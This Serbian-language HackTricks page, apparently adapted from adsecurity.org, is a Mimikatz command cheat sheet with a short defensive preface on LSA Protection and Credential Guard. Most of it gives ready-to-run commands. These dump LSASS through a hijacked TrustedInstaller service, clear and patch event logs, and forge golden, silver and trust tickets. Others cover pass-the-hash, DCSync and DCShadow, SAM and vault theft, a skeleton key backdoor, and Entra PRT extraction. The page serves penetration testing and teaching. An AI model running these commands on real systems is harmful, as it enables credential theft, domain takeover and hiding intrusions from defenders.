# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**Ova stranica je zasnovana na stranici sa [adsecurity.org](https://adsecurity.org/?page_id=1821)**. Pogledajte original za više informacija!<sup>[[3]](#references)</sup>

## LM i lozinke u čistom tekstu u memoriji

Od Windows 8.1 i Windows Server 2012 R2, uvedene su značajne mere za zaštitu od krađe akreditiva:

- **LM hash-evi i lozinke u čistom tekstu** više se ne čuvaju u memoriji radi veće bezbednosti. Da bi se onemogućila Digest autentifikacija, određena postavka registra, _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, mora biti podešena na DWORD vrednost `0`, čime se obezbeđuje da se lozinke u „čistom tekstu” ne keširaju u LSASS-u.

- **LSA Protection** štiti proces Local Security Authority (LSA) od neovlašćenog čitanja memorije i ubacivanja koda. To se postiže označavanjem LSASS-a kao zaštićenog procesa. LSA Protection se aktivira na sledeći način:
  1. Izmena registra na lokaciji _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ tako da se `RunAsPPL` podesi na `dword:00000001`.
  2. Implementacija Group Policy Object-a (GPO) koji primenjuje ovu promenu registra na svim upravljanim uređajima.

Uprkos ovim zaštitama, alati poput Mimikatz-a mogu zaobići LSA Protection pomoću određenih drajvera, mada će takve radnje verovatno biti zabeležene u event log-ovima.

Na modernim radnim stanicama ovo je još važnije jer je **Credential Guard podrazumevano omogućen na mnogim sistemima Windows 11 22H2+ i Windows Server 2025 koji su pridruženi domenu, ali nisu DC**, dok je **LSASS-as-PPL podrazumevano omogućen na čistim instalacijama Windows 11 22H2+**. U praksi to znači da `sekurlsa::logonpasswords` često daje manje materijala nego što se očekivalo na osnovu starijih tehnika, a operatori se sve češće okreću **offline minidump-ovima**, **ekstrakciji Kerberos ključeva (`sekurlsa::ekeys`)** ili **modulima usmerenim na CloudAP/PRT**. Za informacije o zaštiti pogledajte [Windows credentials protections](credentials-protections.md).

### Suprotstavljanje uklanjanju SeDebugPrivilege

Administratori obično imaju SeDebugPrivilege, koji im omogućava da debaguju programe. Ova privilegija može biti ograničena kako bi se sprečilo neovlašćeno pravljenje memory dump-ova — uobičajena tehnika koju napadači koriste za izdvajanje akreditiva iz memorije. Međutim, čak i kada je ova privilegija uklonjena, nalog TrustedInstaller i dalje može da pravi memory dump-ove pomoću prilagođene konfiguracije servisa:

```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```

Ovo omogućava dumpovanje memorije procesa `lsass.exe` u datoteku, koja se zatim može analizirati na drugom sistemu radi izdvajanja kredencijala:

```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```

## Mimikatz opcije

Manipulisanje dnevnicima događaja u Mimikatz-u obuhvata dve glavne radnje: brisanje dnevnika događaja i patchovanje Event servisa kako bi se sprečilo beleženje novih događaja. U nastavku su navedene komande za ove radnje:

#### Brisanje dnevnika događaja

Mimikatz podržava `event::clear`. Ova komanda poziva Windows API za brisanje dnevnika događaja za izabrani klasični dnevnik. Podrazumevana vrednost je `Security`; `/log:` bira drugi dnevnik, a pozivalac mora da ima ovlašćenja za njegovo brisanje. Ovo nije isto što i `event::drop`, koja pokušava da zaustavi upisivanje novih zapisa.<sup>[[4]](#references)</sup>

```bash
mimikatz "event::clear /log:Security" exit
```

#### Eksperimentalna funkcija: Zakrpljivanje Event Service-a

- **Komanda**: `event::drop`
- Ova eksperimentalna komanda je osmišljena da izmeni ponašanje Event Logging Service-a i tako ga efektivno spreči da beleži nove događaje.
- Primer: `mimikatz "privilege::debug" "event::drop" exit`

- Komanda `privilege::debug` obezbeđuje da Mimikatz ima potrebne privilegije za izmenu sistemskih servisa.
- Komanda `event::drop` zatim zakrpljuje Event Logging service.

### Napadi pomoću Kerberos tiketa

Koristite komande u nastavku kao brzi podsetnik za sintaksu. Posebne stranice za [golden tickets](../active-directory-methodology/golden-ticket.md), [silver tickets](../active-directory-methodology/silver-ticket.md), [diamond tickets](../active-directory-methodology/diamond-ticket.md) i [over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) sadrže ažurne napomene o AES/PAC/opsec detaljima.

### Kreiranje Golden Ticket-a

Golden Ticket omogućava lažno predstavljanje korisnika sa pristupom celom domenu. Ključna komanda i parametri:

- Komanda: `kerberos::golden`
- Parametri:
  - `/domain`: Ime domena.
  - `/sid`: Security Identifier (SID) domena.
  - `/user`: Korisničko ime za lažno predstavljanje.
  - `/krbtgt`: NTLM hash naloga KDC servisa domena.
  - `/ptt`: Direktno ubacuje tiket u memoriju.
  - `/ticket`: Čuva tiket za kasniju upotrebu.

Primer:

```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```

### Kreiranje Silver Ticket-a

Silver Tickets omogućavaju pristup određenim servisima. Ključna komanda i parametri:

- Komanda: Slično kao kod Golden Ticket-a, ali cilja određene servise.
- Parametri:
  - `/service`: Servis koji treba ciljati (npr. cifs, http).
  - Ostali parametri su slični kao kod Golden Ticket-a.

Primer:

```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```

### Kreiranje Trust Ticket-a

Trust Tickets se koriste za pristup resursima u drugim domenima iskorišćavanjem odnosa poverenja. Ključna komanda i parametri:

- Komanda: Slično kao Golden Ticket, ali za odnose poverenja.
- Parametri:
  - `/target`: FQDN ciljnog domena.
  - `/rc4`: NTLM hash naloga za poverenje.

Primer:

```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```

### Dodatne Kerberos komande

- **Listing Tickets**:

  - Komanda: `kerberos::list`
  - Prikazuje sve Kerberos tikete za trenutnu korisničku sesiju.

- **Pass the Cache**: `kerberos::ptc` čita MIT/Heimdal `.ccache` datoteku, **ne** `.kirbi` datoteku. Putanju do datoteke navedite kao pozicioni argument: `mimikatz "kerberos::ptc C:\Temp\user.ccache" exit`.<sup>[[5]](#references)</sup>

- **Pass the Ticket**: `kerberos::ptt` čita `.kirbi` datoteku ili direktorijum sa takvim datotekama. Putanju takođe prima kao pozicioni argument, a ne kao `/ticket:`: `mimikatz "kerberos::ptt C:\Temp\ticket.kirbi" exit`. Pogledajte [Pass the Ticket](../active-directory-methodology/pass-the-ticket.md) za širi tok rada.<sup>[[6]](#references)</sup>

- **Purge Tickets**:
  - Komanda: `kerberos::purge`
  - Briše sve Kerberos tikete iz sesije.
  - Korisno je pre upotrebe komandi za manipulaciju tiketima kako bi se izbegli konflikti.

### Over-Pass-the-Hash / Pass-the-Key

Ako je `RC4` onemogućen ili nepouzdan, Mimikatz može da ubaci **AES128/AES256 Kerberos ključeve** u trenutnu logon sesiju, umesto da koristi samo NT hash. Ovo obično bolje odgovara modernim domenima nego tretiranje komande `sekurlsa::pth` kao da podržava samo NTLM.<sup>[[1]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```

`/impersonate` ponovo koristi trenutni proces umesto da pokrene novu konzolu, što je korisno kada želite odmah da pokrenete komande kao što je `lsadump::dcsync` u istom kontekstu.

### Manipulacija Active Directory-jem

- **DCShadow**: Privremeno podesite da se mašina ponaša kao DC radi manipulacije AD objektima. Pogledajte [DCShadow](../active-directory-methodology/dcshadow.md).

  - `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Oponašajte DC da biste zatražili podatke o lozinkama. Pogledajte [DCSync](../active-directory-methodology/dcsync.md).
  - `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Pristup kredencijalima

- **LSADUMP::LSA**: Izdvojite kredencijale iz LSA.

  - `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Oponašajte DC koristeći podatke o lozinki računara.

  - _U izvornom kontekstu nije navedena posebna komanda za NetSync._

- **LSADUMP::SAM**: Pristupite lokalnoj SAM bazi podataka.

  - `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Dešifrujte tajne sačuvane u registru.

  - `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Postavite novi NTLM hash za korisnika.

  - `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Preuzmite informacije o autentifikaciji poverenja.
  - `mimikatz "lsadump::trust" exit`

### Kredencijali u oblaku / Entra ID

Na hostovima koji su **Entra ID** ili **hibridno pridruženi**, `sekurlsa::cloudap` može da otkrije keširani materijal **Primary Refresh Token (PRT)** iz LSASS-a. Njegov `ProofOfPossesionKey.KeyValue` je blob ključa sesije zaštićen DPAPI-jem, a ne već dešifrovani ključ.<sup>[[7]](#references)[[8]](#references)</sup> Da biste koristili `/unprotect`, pokrenite `dpapi::cloudapkd` kao `SYSTEM` (na primer, `token::elevate` iz povišene Mimikatz sesije) ili prvo popunite Mimikatz keš ključeva pomoću `sekurlsa::dpapi`. Sam `privilege::debug` ne menja kontekst pozivaoca DPAPI-ja.<sup>[[8]](#references)</sup>

```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEYVALUE> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```

Kopirajte **odgovarajuće** `Context` i `Derived Key` iz prve komande u drugu; Mimikatz generiše novi context ako nije naveden. Čak i za ključ zaštićen TPM-om, Mimikatz može da izvede ključ za potpisivanje koristeći TPM na originalnom uređaju. Nije potrebno izvesti ključ u čistom tekstu, ali uspešno dobijen izvedeni ključ može da potpiše kolačić pregledača.<sup>[[7]](#references)</sup>

Sam PRT string nije dovoljan jer Microsoft Entra zahteva dokaz posedovanja povezanog ključa sesije.<sup>[[9]](#references)</sup> Pogledajte [oporavak DPAPI ključa](../windows-local-privilege-escalation/dpapi-extracting-passwords.md) za druge opcije glavnog ključa i [Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) за ланац на страни cloud-а.

### Razno

- **MISC::Skeleton**: Ubacite backdoor u LSASS na DC-u.
  - `mimikatz "privilege::debug" "misc::skeleton" exit`

### Eskalacija privilegija

- **PRIVILEGE::Backup**: Dobijte prava za pravljenje rezervnih kopija.

  - `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Dobijte privilegije za otklanjanje grešaka.
  - `mimikatz "privilege::debug" exit`

### Izdvajanje credentials

- **SEKURLSA::LogonPasswords**: Prikažite credentials prijavljenih korisnika.

  - `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Izdvojite Kerberos tikete iz memorije.
  - `mimikatz "sekurlsa::tickets /export" exit`

### Manipulacija SID-om i tokenima

- **SID::add/modify**: Promenite SID i SIDHistory.

  - Dodavanje: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
  - Izmena: _U originalnom kontekstu nije navedena posebna komanda za izmenu._

- **TOKEN::Elevate**: Impersonirajte tokene.
  - `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: Omogućite više RDP sesija.

  - `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Izlistajte TS/RDP sesije.
  - _Nije navedena posebna komanda za TS::Sessions._

### Vault

- Izdvojite lozinke iz Windows Vault-a.
  - `mimikatz "vault::cred /patch" exit`




## References

- [1] [Alati hakera – Mimikatz moduli](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB i Entra ID: Upoznajte svoj novi cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Referenca Mimikatz komandi](https://adsecurity.org/?page_id=1821)
- [4] [Izvorni kod Mimikatz event modula](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_event.c)
- [5] [Izvorni kod Mimikatz ccache modula](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos_ccache.c)
- [6] [Izvorni kod Mimikatz Kerberos modula](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kerberos/kuhl_m_kerberos.c)
- [7] [Mimikatz CloudAP DPAPI implementacija](https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/dpapi/packages/kuhl_m_dpapi_cloudap.c)
- [8] [Detaljnije o Primary Refresh Token-u](https://dirkjanm.io/digging-further-into-the-primary-refresh-token/)
- [9] [Zaštita Microsoft Entra Primary Refresh Token-a](https://learn.microsoft.com/en-us/entra/identity/devices/concept-primary-refresh-token)
{{#include ../../banners/hacktricks-training.md}}
